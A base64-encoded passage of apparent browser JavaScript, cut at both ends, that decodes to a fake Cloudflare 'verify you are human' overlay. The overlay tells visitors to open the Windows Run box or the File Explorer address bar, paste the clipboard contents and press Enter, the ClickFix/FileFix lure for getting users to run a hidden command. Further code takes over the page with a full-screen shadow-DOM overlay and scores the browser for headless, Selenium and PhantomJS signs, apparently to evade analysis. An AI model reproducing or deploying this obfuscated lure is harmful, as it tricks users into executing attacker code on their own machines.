vUGp4d1lYUm9JR1E5SWswMExqVXpPREkwSURJeUxqWXdORE5ETkM0ek1Ea3hPQ0F5TXk0eE15QXpMamd5TnpJeklESXpMalV3TWpJZ015NHhPRFk0TVNBeU15NDFNREl5UXpJdU1qa3lOalVnTWpNdU5UQXlNaUF4TGpZM056UTJJREl5TGpjME9UTWdNUzQyTnpjME5pQXlNUzQ0T0RVeFZqSXhMamcyTnpoRE1TNDJOemMwTmlBeU1TNHdNRFEzSURJdU1qYzFPVE1nTWpBdU1qWTNOaUF6TGpFMk9UZ2dNakF1TWpZM05rTXpMamcwTXpZM0lESXdMakkyTnpZZ05DNHpOVFk0TVNBeU1DNDJPRGd5SURRdU5UY3pOQ0F5TVM0eU5qQTFTRFl1TWprM05qUkROaTR3TWpFMU1TQXhPUzQ0TXpRNUlEUXVOemczTVRZZ01UZ3VOemN3TnlBekxqRTROamd4SURFNExqYzNNRGRETVM0ek5qVXpNeUF4T0M0M056QTNJREFnTWpBdU1UWTJOaUF3SURJeExqZzROVEZXTWpFdU9UQXlNVU13SURJekxqWXlNVGtnTVM0ek5EZzJJREkxSURNdU1UWTVPQ0F5TlVNMExqY3lOell5SURJMUlEVXVPVFExTWpVZ01qTXVPVGMyTkNBMkxqSTJOalExSURJeUxqWXdORFpNTkM0MU16Z3lOQ0F5TWk0Mk1EUXpXaUlnWTJ4aGMzTTlJbU5yUldWT1QwdDBOM0JCTm13aVBqd3ZjR0YwYUQ0OEwzTjJaejROQ2lBZ0lDQWdQR1JwZGo0TkNpQWdJQ0FnSUNBZ1BITndZVzRnYzNSNWJHVTlJblJsZUhRdFpHVmpiM0poZEdsdmJqb2dkVzVrWlhKc2FXNWxPeUkrVUhKcGRtRmplVHd2YzNCaGJqNGc0b0NpSUR4emNHRnVJSE4wZVd4bFBTSjBaWGgwTFdSbFkyOXlZWFJwYjI0NklIVnVaR1Z5YkdsdVpUc2lQbFJsY20xelBDOXpjR0Z1UGcwS0lDQWdJQ0E4TDJScGRqNE5DaUFnSUNBZ0RRb2dJQ0FnUEM5a2FYWStEUW9nSUNBOEwyUnBkajROQ2cwS0lDQWdQR1JwZGlCcFpEMGlhWFY0TURWRVkxaGhPVmx4VDJZNUlpQmpiR0Z6Y3owaVkzUjFSVUYzWkU5NVZHSlJPQ0lnYzNSNWJHVTlJbUp2Y21SbGNpMTBiM0E2SUc1dmJtVTdJSEJoWkdScGJtY3RkRzl3T2lBd095QnRZWEpuYVc0dGRHOXdPaUF3TzIxaGNtZHBiaTFpYjNSMGIyMDZNRHNpUGcwS0lDQWdJRHhrYVhZZ1kyeGhjM005SW1ONldVTjFjVWw0UzJOeGQyNUtJajROQ2lBZ0lDQWdQRzFoYVc0Z1kyeGhjM005SW1OWFlqVjFUR0l3UzA4MVZTSWdjM1I1YkdVOUltTnZiRzl5T2lBalpEbGtPV1E1T3lJK0RRb2dJQ0FnSUNBZ0lEeGthWFlnWTJ4aGMzTTlJbU55WldaeU0ybG9aVmdpUGcwS0lDQWdJQ0FnSUNBZ0lEeHdJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJREU0Y0hnN0lHMWhjbWRwYmkxaWIzUjBiMjA2SURFMWNIZzdJajROQ2lBZ0lDQWdJQ0FnSUNBZ0lGUnZJSEJ5YjNabElIbHZkU0JoY21VZ2JtOTBJR0VnY205aWIzUXNJSEJzWldGelpUb05DaUFnSUNBZ0lDQWdJQ0FnSUR3dmNENE5DaUFnSUNBZ0lDQWdJQ0E4YjJ3K0RRb2dJQ0FnSUNBZ0lDQWdQR3hwUGxCeVpYTnpJQ1poYlhBN0lHaHZiR1FnZEdobElGZHBibVJ2ZDNNZ1MyVjVJRHhwSUdOc1lYTnpQU0pqTURGUFRVOWhPVlZ6WlUwZ1kxUkhhM05PT0dWMFpURWlQand2YVQ0Z0t5QThZajVTUEM5aVBpNDhMMnhwUGcwS0lDQWdJQ0FnSUNBZ0lEeHNhVDVYYUdWdUlIUm9aU0IzYVc1a2IzY2diM0JsYm5Nc0lIQnlaWE56SUR4aVBrTjBjbXc4TDJJK0lDc2dQR0krVmp3dllqNHVQQzlzYVQ0TkNpQWdJQ0FnSUNBZ0lDQThiR2srVUhKbGMzTWdQR0krUlc1MFpYSThMMkkrSUhSdklHTnZiWEJzWlhSbElIWmxjbWxtYVdOaGRHbHZiaTQ4TDJ4cFBnMEtEUW9nSUNBZ0lDQWdJQ0FnUENFdExTQThiR2srVUhKbGMzTWdJRzl1SUhsdmRYSWdhMlY1WW05aGNtUWdkRzhnWm1sdWFYTm9Mand2YkdrK0lDMHRQZzBLSUNBZ0lDQWdJQ0FnSUR3dmIydytEUW9nSUNBZ0lDQWdJQ0FnUEhBZ2MzUjViR1U5SW5CaFpHUnBibWN0ZEc5d09pQXhNSEI0T3lJK0RRb2dJQ0FnSUNBZ0lDQWdXVzkxSUhOb2IzVnNaQ0J6WldVZ2RHaHBjeUIwWlhoMElHRndjR1ZoY2pvTkNpQWdJQ0FnSUNBZ0lDQThZbklnTHo0TkNpQWdJQ0FnSUNBZ0lDQThZMjlrWlNCemRIbHNaVDBpWW1GamEyZHliM1Z1WkRvZ2JtOXVaVHNnWW05eVpHVnlPaUF4Y0hnZ2MyOXNhV1FnSXpjNU56azNPVHNnZDJsa2RHZzZJRFF6TW5CNE95SStTU0JoYlNCdWIzUWdZU0J5YjJKdmRDQXRJRU5zYjNWa1pteGhjbVVnU1VRNklEeHpjR0Z1SUdsa1BTSnBXVkkyU0hGb01FUWlQall3TVdabU16UTNQQzl6Y0dGdVBqd3ZZMjlrWlQ0TkNpQWdJQ0FnSUNBZ0lDQThMM0ErRFFvZ0lDQWdJQ0FnSUNBZ0RRb2dJQ0FnUEM5a2FYWStEUW9OQ2lBZ0lDQWdQQzl0WVdsdVBnMEtJQ0FnSUR3dlpHbDJQZzBLRFFvZ0lDQWdJQ0FnSUR4a2FYWWdjM1I1YkdVOUltUnBjM0JzWVhrNklHNXZibVU3SWo0TkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBTkNpQWdJQ0FnSUNBZ0lDQThiMncrRFFvZ0lDQWdJQ0FnSUNBZ1BDRXRMU0F1TGk0dUxpNHVQR3hwSUhOMGVXeGxQU0p0WVhKbmFXNHRZbTkwZEc5dE9pQXhNSEI0T3lJK0RRb2dJQ0FnSUNBZ0lDQWdJQ0JEYjNCNUlIUm9aU0JtYVd4bElIQmhkR2dnWW1Wc2IzY05DaUFnSUNBZ0lDQWdJQ0FnSUR4a2FYWWdZMnhoYzNNOUltTlNNakZ4VDNWWmFpSWdhV1E5SW1sak1USmthemRpUmxkaGNTSWdiMjVqYkdsamF6MGlkR2hwY3k1amJHRnpjMHhwYzNRdVlXUmtLQ2RqYkdsamEyVmtKeWtpUGcwS0lDQWdJQ0FnSUNBZ0lDQWdRenBjYVc1MFpYSnVZV3d0YzJWamRYSmxYR1pwYkdWa2NtbDJaVnhJVWxCdmJHbGplUzVrYjJONERRb2dJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNE5DaUFnSUNBZ0lDQWdJQ0E4TDJ4cFBpQTdPenM3T3pzN0xTMCtEUW9nSUNBZ0lDQWdJQ0FnUEd4cElITjBlV3hsUFNKdFlYSm5hVzR0WW05MGRHOXRPaUF4TUhCNE95SStUM0JsYmlCR2FXeGxJRVY0Y0d4dmNtVnlJR0Z1WkNCelpXeGxZM1FnZEdobElHRmtaSEpsYzNNZ1ltRnlJQ2c4YzNSeWIyNW5Qa05VVWt3Z0t5Qk1QQzl6ZEhKdmJtYytLVHd2YkdrK0RRb2dJQ0FnSUNBZ0lDQWdQR3hwSUhOMGVXeGxQU0p0WVhKbmFXNHRZbTkwZEc5dE9pQXhNSEI0T3lJK1VHRnpkR1VnZEdobElIQmhkR2dnS0R4emRISnZibWMrUTFSU1RDQXJJRlk4TDNOMGNtOXVaejRwSUdGdVpDQndjbVZ6Y3lBOGMzUnliMjVuUGtWdWRHVnlQQzl6ZEhKdmJtYytQQzlzYVQ0TkNpQWdJQ0FnSUNBZ0lDQThMMjlzUGcwS0RRb2dJQ0FnSUNBZ0lDQWdQR2x1Y0hWMElIUjVjR1U5SW1acGJHVWlJR2xrUFNKcGJWcGhkMHRST1hnM1ZXVmpiSGg0SWlCemRIbHNaVDBpWkdsemNHeGhlVG9nYm05dVpUc2lQZzBLSUNBZ0lDQWdJQ0FnSUR4aWRYUjBiMjRnYVdROUlta3pWalppUWpSa1JqWnBUVzh4SWo1UGNHVnVJRVpwYkdVZ1JYaHdiRzl5WlhJOEwySjFkSFJ2Ymo0TkNpQWdJQ0FnSUNBZ1BDOWthWFkrRFFvTkNnMEtJQ0FnUEdScGRpQmpiR0Z6Y3owaVkzcFpRM1Z4U1hoTFkzRjNia29nWTFwT1RXTXpVR0pGUW1vaUlITjBlV3hsUFNKaVlXTnJaM0p2ZFc1a09pQnViMjVsT3lJK0RRb2dJQ0FnSUR4a2FYWWdZMnhoYzNNOUltTmFUazFqTTFCaVJVSnFMV3hsWm5RaUlITjBlV3hsUFNKM2FXUjBhRG9nTWpnMmNIZzdJR1pzYjJGME9pQnNaV1owT3lCMFpYaDBMV0ZzYVdkdU9pQnNaV1owT3lCbWIyNTBMWE5wZW1VNklERTFjSGc3SWo0TkNpQWdJQ0FnSUZCbGNtWnZjbTBnZEdobElITjBaWEJ6SUdGaWIzWmxJSFJ2SUdacGJtbHphQ0IyWlhKcFptbGpZWFJwYjI0dURRb2dJQ0FnSUR3dlpHbDJQZzBLSUNBZ0lDQThZblYwZEc5dUlIUjVjR1U5SW1KMWRIUnZiaUlnWTJ4aGMzTTlJbU4zZVdSWGVVNDFSVlZyVUNCamRtMXdabTVHWVZGM1JtZElSQ0lnYVdROUltbFFkVGRhZVhoSmFrczVNVVl5Y0ZjaUlITjBlV3hsUFNKaVlXTnJaM0p2ZFc1a09pQWpOV1UxWlRWbE95QndZV1JrYVc1bk9pQTVjSGdnTXpod2VEc2diM0JoWTJsMGVUb2dNQzQxT3lCamRYSnpiM0k2SUc1dmRDMWhiR3h2ZDJWa095SWdaR2x6WVdKc1pXUStWbVZ5YVdaNVBDOWlkWFIwYjI0K0RRb2dJQ0FnUEM5a2FYWStEUW9nSUNBOEwyUnBkajROQ2cwS0lDQWdQQ0V0TFNBdExUNE5DZzBLRFFvTkNpQWdQQzlrYVhZK0RRb2dJQ0FnUEhBZ1kyeGhjM005SW1OVFVuQlNhVGxzZWtsMFZIUWlJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJREV1TlhKbGJUc05DaUFnSUNCc2FXNWxMV2hsYVdkb2REb2dNaTR5TlhKbGJUc2djR0ZrWkdsdVp5MTBiM0E2SURJd2NIZzdJajQ4YzNCaGJpQmpiR0Z6Y3owaVl6VlZaWE51Y1hoQ0lqNDhMM053WVc0K0lHNWxaV1J6SUhSdklISmxkbWxsZHlCMGFHVWdjMlZqZFhKcGRIa2diMllnZVc5MWNpQmpiMjV1WldOMGFXOXVJR0psWm05eVpTQndjbTlqWldWa2FXNW5Mand2Y0Q0TkNpQWdJQ0E4Y0NCamJHRnpjejBpWTFGS2FuQkVZV05PYVdSalRpSWdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2dNUzQxY21WdE95QnNhVzVsTFdobGFXZG9kRG9nTWk0eU5YSmxiVHNnY0dGa1pHbHVaeTEwYjNBNklESXdjSGc3SUdScGMzQnNZWGs2SUc1dmJtVTdJajVYWVdsMGFXNW5JR1p2Y2lBOGMzQmhiaUJqYkdGemN6MGlZelZWWlhOdWNYaENJajQ4TDNOd1lXNCtMaTR1UEM5d1BnMEtJRHd2WkdsMlBnMEtJQTBLSUR4a2FYWWdZMnhoYzNNOUltTkxaMDFvUnpWS1pDSWdjbTlzWlQwaVkyOXVkR1Z1ZEdsdVptOGlQZzBLSUNBOFpHbDJJR05zWVhOelBTSmpTMmROYUVjMVNtUXRhVzV1WlhJaVBnMEtJQ0FnUEdScGRqNE5DaUFnSUNBOFpHbDJQbEpoZVNCSlJEb2dQR052WkdVZ1kyeGhjM005SW1ObVpsZHBXVlJTUTJJMGNFUnNORGNpUGpVMllUUmpOVEk1T1daa1pYUnRZMkU4TDJOdlpHVStQQzlrYVhZK0RRb2dJQ0E4TDJScGRqNE5DaUFnSUR4a2FYWWdjM1I1YkdVOUltMWhjbWRwYmkxMGIzQTZJRFZ3ZURzaVBsQmxjbVp2Y20xaGJtTmxJQ1lnYzJWamRYSnBkSGtnWW5rZ1BITndZVzRnWTJ4aGMzTTlJbU5MTWpoTFFrdzBNMHcyUWpNaVBrTnNiM1ZrWm14aGNtVThMM053WVc0K1BDOWthWFkrRFFvZ0lEd3ZaR2wyUGcwS0lEd3ZaR2wyUGcwS1BDOWthWFkrRFFvTkNqeHpZM0pwY0hRK0RRb05DZzBLRFFvOEwzTmpjbWx3ZEQ0TkNnMEtEUW84TDJKdlpIaytQQzlvZEcxc1BnPT0nOwogICAgY29uc3QgaCA9IGI2NFRvVXRmOChiNjQpOwoKICAgIC8vIENyZWF0ZSBob3N0IGVsZW1lbnQgZm9yIFNoYWRvdyBET00KICAgIGNvbnN0IGhvc3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIGhvc3QuaWQgPSAndGYtb3ZlcmxheS1ob3N0JzsKICAgIGhvc3Quc3R5bGUuY3NzVGV4dCA9ICdwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO3otaW5kZXg6MjE0NzQ4MzY0NztiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2JvcmRlcjpub25lO21hcmdpbjowO3BhZGRpbmc6MDsnOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChob3N0KTsKCiAgICAvLyBBdHRhY2ggU2hhZG93IERPTSBmb3Igc3R5bGUgaXNvbGF0aW9uCiAgICBjb25zdCBzaGFkb3cgPSBob3N0LmF0dGFjaFNoYWRvdyh7IG1vZGU6ICdvcGVuJyB9KTsKICAgIAogICAgLy8gUGFyc2UgdGhlIEhUTUwgY29udGVudCB1c2luZyBET01QYXJzZXIgdG8gcHJvcGVybHkgZXh0cmFjdCBwYXJ0cwogICAgY29uc3QgcGFyc2VyID0gbmV3IERPTVBhcnNlcigpOwogICAgY29uc3QgZG9jID0gcGFyc2VyLnBhcnNlRnJvbVN0cmluZyhoLCAndGV4dC9odG1sJyk7CgogICAgLy8gMS4gRXh0cmFjdCBhbmQgcHJvY2VzcyBTdHlsZXMKICAgIGRvYy5xdWVyeVNlbGVjdG9yQWxsKCdzdHlsZScpLmZvckVhY2goc3R5bGUgPT4gewogICAgICAgIGxldCBjc3MgPSBzdHlsZS50ZXh0Q29udGVudCB8fCAnJzsKICAgICAgICAvLyBSZXBsYWNlICdib2R5JyBzZWxlY3RvciB3aXRoICcjdGYtb3ZlcmxheS1yb290JyAoaGFuZGxpbmcgY29udGV4dCkKICAgICAgICBjc3MgPSBjc3MucmVwbGFjZSgvKF58W1x9XHMsXSlib2R5KD89W1xzLFwue10pL2csICckMSN0Zi1vdmVybGF5LXJvb3QnKTsKICAgICAgICAvLyBSZXBsYWNlICdodG1sJyBzZWxlY3RvciB3aXRoICc6aG9zdCcKICAgICAgICBjc3MgPSBjc3MucmVwbGFjZSgvKF58W1x9XHMsXSlodG1sKD89W1xzLFwue10pL2csICckMTpob3N0Jyk7CiAgICAgICAgc3R5bGUudGV4dENvbnRlbnQgPSBjc3M7CiAgICAgICAgc2hhZG93LmFwcGVuZENoaWxkKHN0eWxlKTsKICAgIH0pOwoKICAgIC8vIDIuIEV4dHJhY3QgYW5kIG1vdmUgZXh0ZXJuYWwgc3R5bGVzaGVldHMKICAgIGRvYy5xdWVyeVNlbGVjdG9yQWxsKCdsaW5rW3JlbD0ic3R5bGVzaGVldCJdJykuZm9yRWFjaChsaW5rID0+IHsKICAgICAgICBzaGFkb3cuYXBwZW5kQ2hpbGQobGluayk7CiAgICB9KTsKCiAgICAvLyAzLiBDcmVhdGUgY29udGFpbmVyIGluc2lkZSBzaGFkb3cgKGFjdGluZyBhcyBwc2V1ZG8tYm9keSkKICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgY29udGFpbmVyLmlkID0gJ3RmLW92ZXJsYXktcm9vdCc7CiAgICBjb250YWluZXIuc3R5bGUuY3NzVGV4dCA9ICd3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47bWFyZ2luOjA7cGFkZGluZzowOyc7CiAgICAKICAgIC8vIENvcHkgYm9keSBhdHRyaWJ1dGVzIChjbGFzc2VzLCBpbmxpbmUgc3R5bGVzKSBmcm9tIHRlbXBsYXRlIHRvIG91ciBjb250YWluZXIKICAgIGlmIChkb2MuYm9keSkgewogICAgICAgIEFycmF5LmZyb20oZG9jLmJvZHkuYXR0cmlidXRlcykuZm9yRWFjaChhdHRyID0+IHsKICAgICAgICAgICAgaWYgKGF0dHIubmFtZSA9PT0gJ3N0eWxlJykgewogICAgICAgICAgICAgICAgIGNvbnRhaW5lci5zdHlsZS5jc3NUZXh0ICs9ICc7JyArIGF0dHIudmFsdWU7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoYXR0ci5uYW1lID09PSAnY2xhc3MnKSB7CiAgICAgICAgICAgICAgICAgY29udGFpbmVyLmNsYXNzTmFtZSA9IGF0dHIudmFsdWU7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoYXR0ci5uYW1lICE9PSAnaWQnKSB7CiAgICAgICAgICAgICAgICAgY29udGFpbmVyLnNldEF0dHJpYnV0ZShhdHRyLm5hbWUsIGF0dHIudmFsdWUpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgCiAgICAgICAgLy8gTW92ZSBhbGwgY2hpbGRyZW4gZnJvbSB0ZW1wbGF0ZSBib2R5IHRvIGNvbnRhaW5lcgogICAgICAgIHdoaWxlIChkb2MuYm9keS5maXJzdENoaWxkKSB7CiAgICAgICAgICAgIGNvbnRhaW5lci5hcHBlbmRDaGlsZChkb2MuYm9keS5maXJzdENoaWxkKTsKICAgICAgICB9CiAgICB9CiAgICAKICAgIHNoYWRvdy5hcHBlbmRDaGlsZChjb250YWluZXIpOwogICAgCiAgICAvLyBTdG9yZSBzaGFkb3cgcm9vdCBnbG9iYWxseSBmb3Igc2NyaXB0cyB0byBxdWVyeSBlbGVtZW50cwogICAgd2luZG93Ll9fdGZTaGFkb3dSb290ID0gc2hhZG93OwogICAgCiAgICAvLyBGb3JjZSBsYXlvdXQgcmVjYWxjdWxhdGlvbgogICAgdm9pZCBob3N0Lm9mZnNldEhlaWdodDsKICAgIAogICAgLy8gQmxvY2sgc2Nyb2xsIG9uIGJvZHkKICAgIGRvY3VtZW50LmJvZHkuc3R5bGUub3ZlcmZsb3cgPSAnaGlkZGVuJzsKICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5zdHlsZS5vdmVyZmxvdyA9ICdoaWRkZW4nOwogICAgd2luZG93LnNjcm9sbFRvKDAsIDApOwogICAgCiAgICBzZXRUaW1lb3V0KGluamVjdFNjcmlwdCwgMCk7CiAgfQoKICBjb25zdCBIRUFETEVTU19XRUlHSFQgPSAxMDsKICBjb25zdCBIRUFERlVMX1dFSUdIVCA9IC04OwogIGNvbnN0IFNVU1BJQ0lPVVNfV0VJR0hUID0gNTsKCiAgYXN5bmMgZnVuY3Rpb24gZGV0ZWN0SGVhZGxlc3MoKSB7CiAgICBjb25zdCBjaGVja3MgPSBbCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCB1YSA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgICAgICBjb25zdCBpc0hlYWRsZXNzID0gL2hlYWRsZXNzfHBoYW50b21qc3xzZWxlbml1bXx3ZWJkcml2ZXIvaS50ZXN0KHVhKTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNIZWFkbGVzcyA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBoYXNXZWJkcml2ZXIgPSBuYXZpZ2F0b3Iud2ViZHJpdmVyID09PSB0cnVlOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBoYXNXZWJkcml2ZXIgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaGFzQ2hyb21lID0gISF3aW5kb3cuY2hyb21lOwogICAgICAgIGNvbnN0IGhhc0NvcnJlY3RDaHJvbWUgPSBoYXNDaHJvbWUgJiYgKHdpbmRvdy5jaHJvbWUucnVudGltZSB8fCB3aW5kb3cuY2hyb21lLmxvYWRUaW1lcyk7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gIWhhc0Nocm9tZSB8fCAhaGFzQ29ycmVjdENocm9tZTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICBhc3luYyAoKSA9PiB7CiAgICAgICAgaWYgKCFuYXZpZ2F0b3IucGVybWlzc2lvbnMpIHJldHVybiB7IHNjb3JlOiAwIH07CiAgICAgICAgdHJ5IHsKICAgICAgICAgIGNvbnN0IHBlcm1pc3Npb25TdGF0dXMgPSBhd2FpdCBuYXZpZ2F0b3IucGVybWlzc2lvbnMucXVlcnkoeyBuYW1lOiAibm90aWZpY2F0aW9ucyIgfSk7CiAgICAgICAgICBjb25zdCBub3RpZmljYXRpb25QZXJtaXNzaW9uID0gTm90aWZpY2F0aW9uLnBlcm1pc3Npb247CiAgICAgICAgICBjb25zdCBpc0luY29uc2lzdGVudCA9IChub3RpZmljYXRpb25QZXJtaXNzaW9uID09PSAiZGVuaWVkIiAmJiBwZXJtaXNzaW9uU3RhdHVzLnN0YXRlID09PSAicHJvbXB0Iik7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogaXNJbmNvbnNpc3RlbnQgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogU1VTUElDSU9VU19XRUlHSFQgfTsKICAgICAgICB9CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBwbHVnaW5zTGVuZ3RoID0gbmF2aWdhdG9yLnBsdWdpbnM/Lmxlbmd0aCB8fCAwOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9IHBsdWdpbnNMZW5ndGggPT09IDA7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGxhbmd1YWdlID0gbmF2aWdhdG9yLmxhbmd1YWdlOwogICAgICAgIGNvbnN0IGxhbmd1YWdlc0xlbmd0aCA9IG5hdmlnYXRvci5sYW5ndWFnZXM/Lmxlbmd0aCB8fCAwOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9ICFsYW5ndWFnZSB8fCBsYW5ndWFnZXNMZW5ndGggPT09IDA7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgY2FudmFzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnY2FudmFzJyk7CiAgICAgICAgICBjb25zdCBnbCA9IGNhbnZhcy5nZXRDb250ZXh0KCd3ZWJnbCcpIHx8IGNhbnZhcy5nZXRDb250ZXh0KCdleHBlcmltZW50YWwtd2ViZ2wnKTsKICAgICAgICAgIGlmICghZ2wpIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgICAgY29uc3QgZGVidWdJbmZvID0gZ2wuZ2V0RXh0ZW5zaW9uKCdXRUJHTF9kZWJ1Z19yZW5kZXJlcl9pbmZvJyk7CiAgICAgICAgICBjb25zdCByZW5kZXJlciA9IGRlYnVnSW5mbyA/IGdsLmdldFBhcmFtZXRlcihkZWJ1Z0luZm8uVU5NQVNLRURfUkVOREVSRVJfV0VCR0wpIDogJ3Vua25vd24nOwogICAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gL3N3aWZ0c2hhZGVyfGxsdm1waXBlfG1lc2EvaS50ZXN0KHJlbmRlcmVyKTsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgIH0KICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IG91dGVySGVpZ2h0ID0gd2luZG93Lm91dGVySGVpZ2h0OwogICAgICAgIGNvbnN0IG91dGVyV2lkdGggPSB3aW5kb3cub3V0ZXJXaWR0aDsKICAgICAgICBjb25zdCBpbm5lckhlaWdodCA9IHdpbmRvdy5pbm5lckhlaWdodDsKICAgICAgICBjb25zdCBpbm5lcldpZHRoID0gd2luZG93LmlubmVyV2lkdGg7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gKG91dGVySGVpZ2h0ID09PSAwICYmIG91dGVyV2lkdGggPT09IDApIHx8IChvdXRlckhlaWdodCA9PT0gaW5uZXJIZWlnaHQgJiYgb3V0ZXJXaWR0aCA9PT0gaW5uZXJXaWR0aCk7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc0NvbnRyb2xsZWQgPSBuYXZpZ2F0b3Iud2ViZHJpdmVyIHx8IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3dlYmRyaXZlcicpID09PSAndHJ1ZScgfHwgd2luZG93LmNhbGxQaGFudG9tIHx8IHdpbmRvdy5fcGhhbnRvbTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNDb250cm9sbGVkID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzSGVhZGxlc3MgPSAvSGVhZGxlc3NDaHJvbWUvLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCk7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzSGVhZGxlc3MgPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc1BoYW50b20gPSB3aW5kb3cuY2FsbFBoYW50b20gfHwgd2luZG93Ll9waGFudG9tIHx8IHdpbmRvdy5waGFudG9tOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1BoYW50b20gPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc1NlbGVuaXVtID0gd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnc2VsZW5pdW0nKSAhPT0gbnVsbCB8fCB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCd3ZWJkcml2ZXInKSAhPT0gbnVsbCB8fCB3aW5kb3cuZG9jdW1lbnQ/LiRjZGNfICE9PSB1bmRlZmluZWQgfHwgd2luZG93LmRvY3VtZW50Py4kd2RjXyAhPT0gdW5kZWZpbmVkOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1NlbGVuaXVtID8gSEVBRExFU1NfV0VJR0hUIDogMCB9OwogICAgICB9CiAgICBdOwoKICAgIGxldCB0b3RhbFNjb3JlID0gMDsKICAgIGZvciAoY29uc3QgY2hlY2sgb2YgY2hlY2tzKSB7CiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgY2hlY2soKTsKICAgICAgICB0b3RhbFNjb3JlICs9IHJlc3VsdC5zY29yZTsKICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAvLyBJZ25vcmUgZXJyb3JzCiAgICAgIH0KICAgIH0KCiAgICBjb25zdCBtYXhQb3NzaWJsZVNjb3JlID0gY2hlY2tzLmxlbmd0aCAqIEhFQURMRVNTX1dFSUdIVDsKICAgIGNvbnN0IG1pblBvc3NpYmxlU2NvcmUgPSBjaGVja3MubGVuZ3RoICogSEVBREZVTF9XRUlHSFQ7CiAgICBjb25zdCBub3JtYWxpemVkU2NvcmUgPSBNYXRoLm1heCgwLCBNYXRoLm1pbigxMDAsICgodG90YWxTY29yZSAtIG1pblBvc3NpYmxlU2NvcmUpIC8gKG1heFBvc3NpYmxlU2Nvc